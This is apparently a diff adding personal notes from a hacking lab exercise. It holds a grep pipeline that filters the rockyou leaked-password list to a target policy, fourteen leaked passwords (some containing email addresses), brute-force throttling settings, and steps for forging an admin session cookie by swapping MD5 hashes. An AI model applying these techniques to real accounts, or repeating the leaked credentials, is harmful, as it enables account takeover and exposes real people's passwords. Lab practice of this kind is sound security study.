@@ -1,0 +1,49 @@
+The password must start with a capital letter
+The password must contain at least one lowercase
+The password must end with a digit
+The password must contain at least one special char: $ # @
+The password must be longer than 20 characters
+The password must be shorter than 29 characters
+
+Aa@2Aa@2Aa@2Aa@2Aa@2Aa@2Aa@2
+======================================================
+support.us
+support.it
+support.gr
+support.cn
+======================================================
+sudo grep '^[[:upper:]]' /home/l4b/Downloads/seclistsIMPROVED/Passwords/Leaked-Databases/rockyou.txt | grep '[$#@]' | grep '[[:lower:]]' | grep -E '.{19,}[0-9]$'
+
+IuBitzik@_B3b3_&*%1990
+TrillPrincessMentality#1
+Sn@tch01159552520096
+Ninglove_ruk_skn@hotmail.comday170526180127
+Mustang#firebird1995
+Mi$un'sbrthd8iz12256
+Kaalyah,Jarren,Desmond,Terence#1
+KAEW_ST@hotmail.com20051986
+GG_AF_In_LOVE@hotmail.com0843771156
+Blessedbe1@endofritual2
+BisocaBuzau#20061985
+Barrackpore.1998@05,1411
+B@BYme&my$exiness123
+ABCDefgh@BungurBaru17
+====-----------------------------------------------
+USE THE RESOURCE POOL WITH DELAY OF 30000 MILISECONDS OR 20 SECONDS
+AND MAXIMUM CONCURRENT REQUESTS SET TO 5
+
+https://md5decrypt.net/
+
+https://www.tunnelsup.com/hash-analyzer/
+
+https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=WVdZMk1UY3laR0V4WmpNMU0yRTVZamxpWW1KaFlXTXpZV014WldRMFl6UTZORE0wT1Rrd1l6aGhNalZrTW1KbE9UUTROak0xTmpGaFpUazRZbVEyT0RJPQ
+
+we got a md5 hash from the base64 so we need to decrypt de md5 and we get "support" so we will change it to "admin""admin.us" and enccrypt it back to the original form by using reverse engineering.
+
+YWY2MTcyZGExZjM1M2E5YjliYmJhYWMzYWMxZWQ0YzQ6NDM0OTkwYzhhMjVkMmJlOTQ4NjM1NjFhZTk4YmQ2ODI=
+
+af6172da1f353a9b9bbbaac3ac1ed4c4:434990c8a25d2be94863561ae98bd682
+
+5e2dea20edeb5de788969bd9d441aaa9:21232f297a57a5a743894a0e4a801fc3
+
+NWUyZGVhMjBlZGViNWRlNzg4OTY5YmQ5ZDQ0MWFhYTk6MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
